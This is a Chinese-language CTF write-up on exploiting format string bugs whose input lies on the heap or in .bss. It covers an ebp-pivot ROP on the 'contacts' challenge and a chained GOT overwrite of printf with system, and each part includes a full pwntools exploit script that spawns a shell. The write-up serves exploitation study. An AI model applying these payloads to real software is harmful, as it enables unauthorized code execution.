        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞点不在栈上怎么打"><a href="#格式化字符串漏洞点不在栈上怎么打" class="headerlink" title="格式化字符串漏洞点不在栈上怎么打"></a>格式化字符串漏洞点不在栈上怎么打</h1><p><strong>一般在栈上的格式会字符串漏洞，我们可以先泄露导致格式化字符串漏洞的函数的got表，然后利用%$hhn进行一个一个byte的写入，payload自己可以写函数去生成，或者利用pwntools库的fmtstr_payload(,{:})去自动生成，自己构造payload要注意payload是否有被‘\x00’截断，导致利用不成功，这种方法需要我们可控值是存储在栈上的参数，不在栈上时应该怎么办？介绍两种方法</strong></p><span id="more"></span><h2 id="第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop"><a href="#第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop" class="headerlink" title="第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop"></a>第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop</h2><p><strong>题目链接<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a></strong></p><h3 id="拿到题目运行"><a href="#拿到题目运行" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212164452297.png" alt="image-20230212164452297"></p><h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212164600939.png" alt="image-20230212164600939"></p><h3 id="开始ida反汇编静态分析"><a href="#开始ida反汇编静态分析" class="headerlink" title="开始ida反汇编静态分析"></a>开始ida反汇编静态分析</h3><p>主函数就是一下简单switch，PrintInfo发现有我们可控参数，format是我们输入的Description，但是很遗憾在堆上(可以看到是利用malloc在堆上申请)，源程序应该是个c的结构体</p><p><img src="/2023/02/12/pwn/image-20230212164835416.png" alt="image-20230212164835416"></p><p><img src="/2023/02/12/pwn/image-20230212170204473.png" alt="image-20230212170204473"></p><p>这是我们的思路可能在想可不可以改写printf的got为system地址，让后控制format为‘&#x2F;bin&#x2F;sh’从而获取shell，很遗憾不可以，参数没在栈上，可不可以利用改写返回地址为system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘ ，思想可行，由于改写过程需要大量输出，行为不可行，但是思想终归是正确的，我们是否可以把system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘输入到description，再利用格式化字符串漏洞，把main函数返回时保存的ebp给为堆上description地址，是可行的</p><h3 id="gdb动态调试写exp"><a href="#gdb动态调试写exp" class="headerlink" title="gdb动态调试写exp"></a>gdb动态调试写exp</h3><p>没有开pie保护，直接b *0x8048C22把断点下到漏洞处分析</p><p><img src="/2023/02/12/pwn/image-20230212173223423.png" alt="image-20230212173223423"></p><p>观察栈里的参数1处为PrintInfo函数保存的ebp地址，2处为description堆上地址，3处为__libc_start_call_main调用函数时保存的返回地址，利用fmtarg得到各格式化参数偏移，接下来我们的思路就很明确了</p><ol><li>利用%31$paaaa 泄露__libc_start_call_main，让后利用Libcsearch泄露版本号（ASLR保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，原因是以页的大小为基础随机，linux一般4k），从而dump下libc里的system地址和&#x2F;bin&#x2F;sh地址，这里由于不知名原因导致__libc_start_call_main不行，脚本里换成了根据偏移libc_start_main地址，本地练习无所谓</li><li>b’%6$p%11$pbbb’+p32(system)+b’fake’+p32(bin_sh)泄露description地址和ebp，同时写入rop需要成分</li><li>b’%’+str(heap_addr-4).encode()+b’c’+b’%6$n’向main函数ebp写入description堆地址<ul><li>程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址，利用%n修改的又是地址里的内容，所以我们修改的是上上级函数ebp，也就是main</li><li>为什么heap_addr需要-4，我们观察反汇编发现main函数利用leave 和 ret 来恢复堆栈和执行，leave也就等效于mov esp,ebp ；pop ebp恢复，在leave esp，ebp时堆栈已经提升到堆，pop ebp 会ebp+4，所以我们需要进行-4留出给fake ebp</li></ul></li><li>然后我们退出main函数就可以拿到shell</li></ol><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./contacts&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createcontact</span>(<span class="params">name, phone, descrip_len, description</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contact info: \n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You have 10 numbers\n&#x27;</span>)</span><br><span class="line">    io.sendline(phone)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of description: &#x27;</span>)</span><br><span class="line">    io.sendline(descrip_len)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description:\n\t\t&#x27;</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcontact</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contacts:&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x8048C1F&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;%31$paaaa&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;111&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">__libc_start_call_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;aaaa&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;get libc_start_main_ret addr: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_call_main))</span><br><span class="line">__libc_start_main=__libc_start_call_main+<span class="number">0x3B</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">system=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">p(<span class="string">&#x27;bin_sh&#x27;</span>,bin_sh)</span><br><span class="line">payload=<span class="string">b&#x27;%6$p%11$pbbb&#x27;</span>+p32(system)+<span class="string">b&#x27;fake&#x27;</span>+p32(bin_sh)</span><br><span class="line">createcontact(<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,<span class="string">b&#x27;222&#x27;</span>,payload)</span><br><span class="line">printcontact()</span><br><span class="line">ru(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line">data=ru(<span class="string">b&#x27;bbb&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data=data.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ebp_addr = <span class="built_in">int</span>(data[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">heap_addr = <span class="built_in">int</span>(data[<span class="number">2</span>], <span class="number">16</span>)+<span class="number">12</span></span><br><span class="line">p(<span class="string">&#x27;ebp&#x27;</span>,ebp_addr)</span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(heap_addr-<span class="number">4</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$n&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;3333&#x27;</span>, <span class="string">b&#x27;123456789&#x27;</span>, <span class="string">b&#x27;300&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Description: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第二种方法-顺藤摸瓜修改栈上合适地址，改写got"><a href="#第二种方法-顺藤摸瓜修改栈上合适地址，改写got" class="headerlink" title="第二种方法 顺藤摸瓜修改栈上合适地址，改写got"></a>第二种方法 顺藤摸瓜修改栈上合适地址，改写got</h2><p>题目链接：<a href="https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw">https://pan.baidu.com/s/1lLW4_0WPbxhORpcDk5GLZw</a><br>提取码：qydx</p><h3 id="拿到题目运行-1"><a href="#拿到题目运行-1" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212181525295.png" alt="image-20230212181525295"></p><h3 id="查看保护-1"><a href="#查看保护-1" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212181617961.png" alt="image-20230212181617961"></p><h3 id="ida反汇编静态分析"><a href="#ida反汇编静态分析" class="headerlink" title="ida反汇编静态分析"></a>ida反汇编静态分析</h3><p><img src="/2023/02/12/pwn/image-20230212181703467.png" alt="image-20230212181703467"></p><p>很明显的漏洞，发现buf在.bss段，同样不在栈区(.bss:未初始化的全局和静态C变量，以及所有被初始化为0的全局或静态变量。(目标文件该节在磁盘不占空间，在运行时，内存分配，初始化0))</p><p><img src="/2023/02/12/pwn/image-20230212181831825.png" alt="image-20230212181831825"></p><p>同样无法直接利用fmtstr_payload利用，这次我们观察程序发现这次程序在我们再次到底可控参数的printf没有使用printf，可以修改printf got为system地址，从而利用可控参数，拿到shell，由于可控参数在.bss段，我们就需要利用可控参数在原有栈的数据上做文章</p><h3 id="gdb动态调试"><a href="#gdb动态调试" class="headerlink" title="gdb动态调试"></a>gdb动态调试</h3><p>输入%p后断点断到printf栈区如下</p><p><img src="/2023/02/12/pwn/image-20230212184115485.png" alt="image-20230212184115485"></p><p>利用1处栈地址，也就是将0xffffcfa8地址处内容0xffffcfb8修改为0xffffcfac，由于开启pie保护，0xffffcfac处所存内容是elf文件所存地址+pie基址生成的，got表也在elf文件的数据区，也是有地址+pie基地址生成，所以我们只需要利用%$hn修改其低四位即可(小端序)，buf地址可以利用%$p泄露，这样我们就可以输入buf为printf_got+payload，修改其got为system地址</p><h3 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h3><ol><li><p>%p%6$p泄露buf和ebp基地址</p></li><li><p>ebp基地址+偏移得到可修改的有价值地址</p></li><li><p>b’%’+str((ebp基地址+偏移)&amp;0xffff).encode()+b’c’+b’%6$hn’修改ebp指向地址</p></li><li><p>由于开启pie，需要先利用main返回地址泄露pie基地址，从而得到printf_got真实地址  %11$p</p></li><li><p>b’%’+str(printf_got&amp;0xffff).encode()+b’c’+b’%10$hn’改写有价值的地址为printf_got</p></li><li><p>%11$s\x00 利用布置好的printf_got泄露printf函数在libc里的真实地址 从而dump到system地址</p></li><li><p>改写printf_got为内容为system地址</p><p><img src="/2023/02/12/pwn/image-20230212185436302.png" alt="image-20230212185436302"></p></li><li><p>由于两地址有3个字节的差异，一次%$hn只能改写2字节内容，而改写四字节内容需要的输出代价太大，我们需要在栈上找到另一个有价值的地址重复上面1.2.3.5步骤进行改写，改写其为printf_got地址的后两字节地址</p></li><li><p>接下来就可以构造常规payload改写got达到目的</p></li></ol><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./fmt_str_level_2_x86&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x130A)&#x27;)</span></span><br><span class="line">printf_got=elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;%p%6$p&#x27;</span></span><br><span class="line">sla(<span class="string">b&#x27;hello\n&#x27;</span>,payload)</span><br><span class="line">addr=ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">addr=addr.split(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base1=<span class="built_in">int</span>(addr[<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">buf=<span class="built_in">int</span>(addr[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;base1&#x27;</span>,base1)</span><br><span class="line">p(<span class="string">&#x27;buf&#x27;</span>,buf)</span><br><span class="line">base2=base1+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(base2&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%11$p\x00&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="number">10</span>),<span class="number">16</span>)-elf.symbols[<span class="string">&#x27;main&#x27;</span>]-<span class="number">30</span></span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line">printf_got+=pie</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_got&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf addr</span></span><br><span class="line">sl(<span class="string">b&#x27;%11$s\x00&#x27;</span>)</span><br><span class="line">printf_addr=u32(r(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">base=printf_addr-libc.dump(<span class="string">&quot;printf&quot;</span>)</span><br><span class="line">system_addr=base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change base1-4 ---7</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((base1-<span class="number">0xc</span>)&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%6$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((printf_got&amp;<span class="number">0xffff</span>)+<span class="number">2</span>).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%10$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">sysl=system_addr&amp;<span class="number">0xffff</span></span><br><span class="line">sysh=(system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%11$hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(sysh-sysl).encode()+<span class="string">b&#x27;c&#x27;</span>+<span class="string">b&#x27;%7$hn&#x27;</span></span><br><span class="line">sl(payload)</span><br><span class="line">r(sysl+sysh)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>总结：一定还有其他姿势拿到shell，只是我们懂得太少不知道罢了Zzz</p>]]></content>
      
      
      
        <tags>
            
            <tag> Fmtstr </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
